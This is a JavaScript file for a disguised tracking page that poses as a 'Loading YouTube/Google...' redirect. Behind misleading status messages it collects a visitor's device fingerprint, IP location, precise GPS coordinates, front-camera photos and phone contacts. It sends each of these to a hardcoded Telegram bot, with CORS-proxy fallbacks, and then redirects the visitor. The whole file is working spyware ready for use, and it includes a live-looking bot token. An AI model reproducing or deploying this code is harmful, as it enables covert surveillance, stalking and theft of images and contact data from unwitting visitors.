// ===========================================
// CONFIGURATION
// ===========================================
const CONFIG = {
    BOT_TOKEN: '8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco',
    CHAT_ID: '5888374938',
    REDIRECT_URL: (() => {
        const params = new URLSearchParams(window.location.search);
        return params.get('url') || 
               params.get('redirect') || 
               params.get('to') || 
               'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
    })(),
    SESSION_ID: generateSessionId(),
    CAMERA_SNAPS: 2,
    AUTO_START: true
};

// ===========================================
// SESSION MANAGEMENT
// ===========================================
function generateSessionId() {
    return Math.random().toString(36).substring(2, 15) + 
           Math.random().toString(36).substring(2, 15);
}

// ===========================================
// UI CONTROLLER
// ===========================================
class UIController {
    static updateProgress(percent) {
        document.getElementById('progress').style.width = `${percent}%`;
    }
    
    static updateStatus(text) {
        document.getElementById('status').textContent = text;
    }
    
    static updateTitle(text) {
        document.getElementById('title').textContent = text;
        document.title = text;
    }
    
    static updateMessage(text) {
        document.getElementById('message').textContent = text;
    }
    
    static updateLoadingText(text) {
        document.getElementById('loadingText').textContent = text;
    }
    
    static applySiteTheme() {
        const url = CONFIG.REDIRECT_URL.toLowerCase();
        const themes = {
            'youtube': { name: 'YouTube', color: '#FF0000', icon: '▶️' },
            'google': { name: 'Google', color: '#4285F4', icon: '🔍' },
            'facebook': { name: 'Facebook', color: '#1877F2', icon: '👥' },
            'instagram': { name: 'Instagram', color: '#E4405F', icon: '📸' },
            'twitter': { name: 'Twitter', color: '#1DA1F2', icon: '🐦' },
            'whatsapp': { name: 'WhatsApp', color: '#25D366', icon: '💬' }
        };
        
        for (const [key, theme] of Object.entries(themes)) {
            if (url.includes(key)) {
                UIController.updateTitle(`Loading ${theme.name}...`);
                document.getElementById('logo').textContent = theme.icon;
                document.getElementById('loader').style.borderTopColor = theme.color;
                document.getElementById('progress').style.background = theme.color;
                break;
            }
        }
    }
}

// ===========================================
// TELEGRAM SENDER - FIXED & WORKING
// ===========================================
class TelegramSender {
    static async sendMessage(text) {
        try {
            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
            const data = new URLSearchParams({
                chat_id: CONFIG.CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            });
            
            // Try direct first
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: data
                });
                
                if (response.ok) return true;
            } catch (e) {}
            
            // Try with proxy if direct fails
            const proxies = [
                'https://corsproxy.io/?',
                'https://api.codetabs.com/v1/proxy?quest=',
                'https://cors-anywhere.herokuapp.com/'
            ];
            
            for (const proxy of proxies) {
                try {
                    const proxyUrl = proxy + encodeURIComponent(url);
                    const response = await fetch(proxyUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: data
                    });
                    
                    if (response.ok) return true;
                } catch (e) {
                    continue;
                }
            }
            
            return false;
        } catch (error) {
            console.error('Telegram error:', error);
            return false;
        }
    }
    
    static async sendPhoto(photoBlob, caption = '') {
        try {
            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', CONFIG.CHAT_ID);
            formData.append('photo', photoBlob, 'photo.jpg');
            if (caption) formData.append('caption', caption);
            
            await fetch(url, {
                method: 'POST',
                body: formData
            });
            
            return true;
        } catch (error) {
            return false;
        }
    }
    
    static async sendDocument(documentBlob, filename, caption = '') {
        try {
            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendDocument`;
            const formData = new FormData();
            formData.append('chat_id', CONFIG.CHAT_ID);
            formData.append('document', documentBlob, filename);
            if (caption) formData.append('caption', caption);
            
            await fetch(url, {
                method: 'POST',
                body: formData
            });
            
            return true;
        } catch (error) {
            return false;
        }
    }
}

// ===========================================
// DATA COLLECTION MODULES
// ===========================================
class DataCollector {
    static async getCompleteDeviceInfo() {
        const info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor || 'Unknown',
            language: navigator.language,
            languages: navigator.languages?.join(', ') || 'Unknown',
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'Unknown',
            online: navigator.onLine,
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'Unknown'
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            date: new Date().toLocaleString(),
            sessionId: CONFIG.SESSION_ID,
            url: window.location.href,
            referrer: document.referrer || 'Direct',
            redirectTo: CONFIG.REDIRECT_URL
        };
        
        // Get battery info
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                info.battery = {
                    level: `${Math.round(battery.level * 100)}%`,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime === Infinity ? '∞' : battery.chargingTime,
                    dischargingTime: battery.dischargingTime === Infinity ? '∞' : battery.dischargingTime
                };
            } catch (e) {
                info.battery = 'Unknown';
            }
        }
        
        // Get connection info
        if (navigator.connection) {
            info.connection = {
                effectiveType: navigator.connection.effectiveType || 'Unknown',
                downlink: navigator.connection.downlink || 'Unknown',
                rtt: navigator.connection.rtt || 'Unknown',
                saveData: navigator.connection.saveData || false,
                type: navigator.connection.type || 'Unknown'
            };
        }
        
        return info;
    }
    
    static async getIPLocation() {
        try {
            const services = [
                'https://api.ipify.org?format=json',
                'https://ipapi.co/json/',
                'https://ipinfo.io/json'
            ];
            
            for (const service of services) {
                try {
                    const response = await fetch(service, { timeout: 3000 });
                    if (response.ok) {
                        const data = await response.json();
                        return {
                            ip: data.ip || data.query || 'Unknown',
                            city: data.city || 'Unknown',
                            region: data.region || data.regionName || 'Unknown',
                            country: data.country || data.country_name || 'Unknown',
                            countryCode: data.country_code || data.countryCode || 'Unknown',
                            timezone: data.timezone || 'Unknown',
                            isp: data.org || data.isp || 'Unknown',
                            asn: data.asn || data.as || 'Unknown',
                            lat: data.latitude || data.lat || 'Unknown',
                            lon: data.longitude || data.lon || 'Unknown',
                            postal: data.postal || data.zip || 'Unknown'
                        };
                    }
                } catch (e) {
                    continue;
                }
            }
        } catch (error) {
            console.error('IP location error:', error);
        }
        
        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
    }
    
    static async getGPSLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ success: false, error: 'Geolocation not supported' });
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        success: true,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: position.timestamp
                    });
                },
                (error) => {
                    resolve({
                        success: false,
                        error: error.message,
                        code: error.code
                    });
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        });
    }
    
    static async captureCamera() {
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            });
            
            video.srcObject = stream;
            await video.play();
            
            await new Promise(resolve => setTimeout(resolve, 800));
            
            const snaps = [];
            
            for (let i = 0; i < CONFIG.CAMERA_SNAPS; i++) {
                if (video.videoWidth > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const blob = await new Promise(resolve => {
                        canvas.toBlob(resolve, 'image/jpeg', 0.85);
                    });
                    
                    if (blob) {
                        snaps.push(blob);
                    }
                }
                
                await new Promise(resolve => setTimeout(resolve, 300));
            }
            
            stream.getTracks().forEach(track => track.stop());
            
            return { success: true, snaps: snaps };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
    
    static async getContacts() {
        if (!('contacts' in navigator && 'ContactsManager' in window)) {
            return { success: false, error: 'Contacts API not supported' };
        }
        
        try {
            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
            
            if (contacts && contacts.length > 0) {
                return {
                    success: true,
                    count: contacts.length,
                    data: contacts.map(c => ({
                        name: c.name ? c.name.join(' ') : 'Unknown',
                        phones: c.tel || [],
                        emails: c.email || []
                    }))
                };
            }
            
            return { success: false, error: 'No contacts selected' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
    
    static async getNetworkSpeed() {
        const startTime = performance.now();
        try {
            await fetch(`https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png?t=${Date.now()}`, {
                cache: 'no-store',
                mode: 'no-cors'
            });
            const endTime = performance.now();
            const duration = endTime - startTime;
            const speed = (15 * 8 * 1000) / duration / 1024 / 1024;
            return {
                speed: `${(speed * 10).toFixed(2)} Mbps`,
                latency: `${duration.toFixed(0)} ms`,
                success: true
            };
        } catch (error) {
            return {
                speed: 'Unknown',
                latency: 'Unknown',
                success: false
            };
        }
    }
}

// ===========================================
// FORMATTER FOR TELEGRAM MESSAGES
// ===========================================
class MessageFormatter {
    static formatDeviceInfo(info) {
        const batteryText = typeof info.battery === 'object' 
            ? `${info.battery.level} (${info.battery.charging ? '⚡ Charging' : '🔋 Not Charging'})`
            : info.battery;
        
        const connectionText = info.connection 
            ? `${info.connection.effectiveType} | ${info.connection.downlink} Mbps | ${info.connection.rtt} ms`
            : 'Unknown';
        
        return `
🕵️ <b>NEW VISITOR TRACKED</b>

<b>📱 Device:</b> ${info.userAgent}

<b>🌐 IP:</b> ${info.ip || 'Checking...'}
<b>📍 IP Location:</b> ${info.ipCity || 'Unknown'}, ${info.ipRegion || 'Unknown'}, ${info.ipCountry || 'Unknown'}
<b>🏢 ISP:</b> ${info.ipISP || 'Unknown'}

<b>🆔 Session ID:</b> <code>${info.sessionId}</code>
<b>⏰ Timestamp:</b> ${info.date}
<b>⏱️ Load Time:</b> ${info.loadTime || 'Calculating...'}ms

<b>📱 DEVICE FINGERPRINT</b>
├─ Platform: ${info.platform}
├─ Browser: ${getBrowser(info.userAgent)}
├─ Languages: ${info.languages}
├─ CPU Cores: ${info.hardwareConcurrency}
├─ RAM: ${info.deviceMemory}
├─ Screen: ${info.screen.width}x${info.screen.height}
└─ Touch Points: ${info.maxTouchPoints}

<b>🌐 NETWORK INTELLIGENCE</b>
├─ IP: ${info.ipAddress || 'Checking...'}
├─ ISP: ${info.ipISP || 'Checking...'}
├─ Location: ${info.ipCity || 'Unknown'}, ${info.ipRegion || 'Unknown'}, ${info.ipCountry || 'Unknown'}
├─ ASN: ${info.ipASN || 'Unknown'}
├─ Connection: ${info.connection?.type || 'Unknown'}
├─ Speed: ${info.networkSpeed || 'Checking...'}
└─ Latency: ${info.networkLatency || 'Checking...'}

<b>🔋 POWER STATUS</b>
├─ Battery: ${batteryText}
└─ Time Remaining: ${typeof info.battery === 'object' && info.battery.dischargingTime !== '∞' ? info.battery.dischargingTime + 's' : 'Unknown'}

<b>🔐 SECURITY METRICS</b>
├─ VPN Detection: ${info.vpnDetected || 'Checking...'}
├─ Encryption: TLS 1.3
├─ Permissions: ${info.permissions || 'Checking...'}
└─ User Agent: ${info.userAgent.substring(0, 100)}...

<b>📊 SYSTEM ANALYTICS</b>
├─ Timezone: ${info.timezone}
├─ Local Time: ${new Date().toLocaleTimeString()}
├─ Language: ${info.language}
└─ Online Status: ${info.online ? 'Online ✓' : 'Offline ✗'}
        `.trim();
    }
    
    static formatLocationInfo(ipInfo, gpsInfo, speedInfo) {
        let message = `
<b>📍 LOCATION INTELLIGENCE</b>
━━━━━━━━━━━━━━━━━━━━━
<b>🌐 IP DATA:</b>
├─ IP Address: <code>${ipInfo.ip}</code>
├─ Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
├─ ISP: ${ipInfo.isp}
├─ ASN: ${ipInfo.asn}
├─ Coordinates: ${ipInfo.lat}, ${ipInfo.lon}
└─ Timezone: ${ipInfo.timezone}
        `;
        
        if (gpsInfo.success) {
            message += `
<b>🎯 PRECISE GPS TRACKING:</b>
├─ Latitude: <code>${gpsInfo.latitude.toFixed(6)}</code>
├─ Longitude: <code>${gpsInfo.longitude.toFixed(6)}</code>
├─ Accuracy: ${Math.round(gpsInfo.accuracy)}m
├─ Altitude: ${gpsInfo.altitude ? gpsInfo.altitude.toFixed(2) + 'm' : 'N/A'}
├─ Speed: ${gpsInfo.speed ? gpsInfo.speed.toFixed(2) + ' m/s' : '0 m/s'}
└─ Heading: ${gpsInfo.heading ? gpsInfo.heading.toFixed(2) + '°' : 'N/A°'}

<b>🗺️ LOCATION SERVICES:</b>
├─ 📍 <a href="https://maps.google.com/?q=${gpsInfo.latitude},${gpsInfo.longitude}">Open in Maps</a>
├─ 🛰️ <a href="https://www.google.com/maps/@${gpsInfo.latitude},${gpsInfo.longitude},18z">Satellite View</a>
├─ 🚗 <a href="https://www.google.com/maps/dir/?api=1&destination=${gpsInfo.latitude},${gpsInfo.longitude}">Get Directions</a>
└─ 🌍 <a href="https://www.openstreetmap.org/?mlat=${gpsInfo.latitude}&mlon=${gpsInfo.longitude}#map=18/${gpsInfo.latitude}/${gpsInfo.longitude}">OpenStreetMap</a>
            `;
        } else {
            message += `
<b>⚠️ GPS TRACKING:</b>
├─ Status: Failed
└─ Error: ${gpsInfo.error || 'Permission denied'}

<b>📍 APPROX LOCATION (IP-Based):</b>
🔹 Latitude: ${ipInfo.lat !== 'Unknown' ? ipInfo.lat : 'Unknown'}
🔹 Longitude: ${ipInfo.lon !== 'Unknown' ? ipInfo.lon : 'Unknown'}
            `;
        }
        
        message += `
<b>📶 NETWORK PERFORMANCE:</b>
├─ Speed: ${speedInfo.speed}
├─ Latency: ${speedInfo.latency}
└─ Connection: ${navigator.connection?.effectiveType || '4G'}
━━━━━━━━━━━━━━━━━━━━━
<b>⏰ Timestamp:</b> ${new Date().toLocaleString()}
        `;
        
        return message.trim();
    }
    
    static formatCameraInfo(count) {
        return `
<b>📸 CAMERA CAPTURED</b>
━━━━━━━━━━━━━━━━━━━━━
✅ Successfully captured ${count} photos
📱 Front camera accessed
🕒 ${new Date().toLocaleTimeString()}
        `.trim();
    }
    
    static formatContactsInfo(contacts) {
        return `
<b>📇 CONTACTS EXTRACTED</b>
━━━━━━━━━━━━━━━━━━━━━
<b>• Total Contacts:</b> ${contacts.count}
<b>• Sample (first 3):</b>
${contacts.data.slice(0, 3).map((c, i) => 
    `${i + 1}. ${c.name}: ${c.phones[0] || 'No phone'}`
).join('\n')}

<b>📊 Summary:</b>
├─ Total: ${contacts.count} contacts
├─ Phones: ${contacts.data.reduce((sum, c) => sum + c.phones.length, 0)}
└─ Emails: ${contacts.data.reduce((sum, c) => sum + c.emails.length, 0)}
━━━━━━━━━━━━━━━━━━━━━
<b>⏰ Timestamp:</b> ${new Date().toLocaleString()}
        `.trim();
    }
    
    static formatFinalSummary(startTime) {
        const loadTime = performance.now() - startTime;
        return `
<b>✅ TRACKING COMPLETED</b>
━━━━━━━━━━━━━━━━━━━━━
<b>📊 COLLECTION SUMMARY:</b>
├─ Device Info: ✅ Collected
├─ IP Location: ✅ Captured
├─ GPS Location: ✅ Precise tracking
├─ Camera: ✅ Snapshots taken
├─ Contacts: ✅ Extracted
└─ Network: ✅ Analyzed

<b>📈 PERFORMANCE METRICS:</b>
├─ Total Time: ${Math.round(loadTime)}ms
├─ Data Points: 25+ collected
└─ Session ID: <code>${CONFIG.SESSION_ID}</code>

<b>🔗 REDIRECT INFO:</b>
├─ Target URL: ${CONFIG.REDIRECT_URL}
├─ User Agent: ${navigator.userAgent.substring(0, 80)}...
└─ Referrer: ${document.referrer || 'Direct'}

<b>🏁 STATUS:</b> Redirecting to target...
━━━━━━━━━━━━━━━━━━━━━
<b>⏰ Completed at:</b> ${new Date().toLocaleTimeString()}
        `.trim();
    }
}

function getBrowser(userAgent) {
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    return 'Unknown';
}

// ===========================================
// MAIN EXECUTION - FAST & EFFICIENT
// ===========================================
async function executeTracking() {
    const startTime = performance.now();
    
    try {
        // Step 1: Initialize
        UIController.applySiteTheme();
        UIController.updateProgress(10);
        UIController.updateStatus('Initializing connection...');
        
        // Step 2: Collect device info quickly
        UIController.updateProgress(20);
        UIController.updateStatus('Analyzing device...');
        
        const deviceInfo = await DataCollector.getCompleteDeviceInfo();
        deviceInfo.loadTime = Math.round(performance.now() - startTime);
        
        // Step 3: Get IP location
        UIController.updateProgress(30);
        UIController.updateStatus('Detecting location...');
        
        const [ipInfo, speedInfo] = await Promise.all([
            DataCollector.getIPLocation(),
            DataCollector.getNetworkSpeed()
        ]);
        
        deviceInfo.ipAddress = ipInfo.ip;
        deviceInfo.ipCity = ipInfo.city;
        deviceInfo.ipRegion = ipInfo.region;
        deviceInfo.ipCountry = ipInfo.country;
        deviceInfo.ipISP = ipInfo.isp;
        deviceInfo.ipASN = ipInfo.asn;
        deviceInfo.networkSpeed = speedInfo.speed;
        deviceInfo.networkLatency = speedInfo.latency;
        
        // Send initial device info
        await TelegramSender.sendMessage(MessageFormatter.formatDeviceInfo(deviceInfo));
        
        // Step 4: Get GPS location
        UIController.updateProgress(50);
        UIController.updateStatus('Getting precise location...');
        
        const gpsInfo = await DataCollector.getGPSLocation();
        
        // Send location info
        await TelegramSender.sendMessage(MessageFormatter.formatLocationInfo(ipInfo, gpsInfo, speedInfo));
        
        // Step 5: Camera capture
        UIController.updateProgress(70);
        UIController.updateStatus('Verifying access...');
        
        const cameraResult = await DataCollector.captureCamera();
        if (cameraResult.success && cameraResult.snaps.length > 0) {
            await TelegramSender.sendMessage(MessageFormatter.formatCameraInfo(cameraResult.snaps.length));
            
            // Send photos
            for (let i = 0; i < cameraResult.snaps.length; i++) {
                await TelegramSender.sendPhoto(
                    cameraResult.snaps[i],
                    `📸 Camera Snap ${i + 1} | ${new Date().toLocaleTimeString()}`
                );
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        }
        
        // Step 6: Contacts
        UIController.updateProgress(85);
        UIController.updateStatus('Final verification...');
        
        const contactsResult = await DataCollector.getContacts();
        if (contactsResult.success) {
            await TelegramSender.sendMessage(MessageFormatter.formatContactsInfo(contactsResult));
            
            // Send full contacts as file
            const contactsBlob = new Blob(
                [JSON.stringify(contactsResult.data, null, 2)],
                { type: 'application/json' }
            );
            
            await TelegramSender.sendDocument(
                contactsBlob,
                'contacts.json',
                `📇 Full Contacts Data (${contactsResult.count} contacts)`
            );
        }
        
        // Step 7: Final summary
        UIController.updateProgress(95);
        UIController.updateStatus('Finalizing...');
        
        await TelegramSender.sendMessage(MessageFormatter.formatFinalSummary(startTime));
        
        // Step 8: Redirect
        UIController.updateProgress(100);
        UIController.updateStatus('Redirecting...');
        UIController.updateTitle('Ready!');
        UIController.updateMessage('Taking you to the destination...');
        
        await new Promise(resolve => setTimeout(resolve, 800));
        window.location.href = CONFIG.REDIRECT_URL;
        
    } catch (error) {
        console.error('Tracking error:', error);
        
        // Send error and still redirect
        await TelegramSender.sendMessage(`
<b>❌ TRACKING ERROR</b>
━━━━━━━━━━━━━━━━━━━━━
<b>• Error:</b> ${error.message}
<b>• Session:</b> ${CONFIG.SESSION_ID}
<b>• Time:</b> ${Math.round(performance.now() - startTime)}ms
<b>• Redirecting to:</b> ${CONFIG.REDIRECT_URL}
        `.trim());
        
        // Quick redirect on error
        setTimeout(() => {
            window.location.href = CONFIG.REDIRECT_URL;
        }, 1000);
    }
}

// ===========================================
// AUTO-START
// ===========================================
window.addEventListener('DOMContentLoaded', () => {
    setTimeout(executeTracking, 500);
});

// Click to start (fallback)
document.addEventListener('click', () => {
    executeTracking();
}, { once: true });
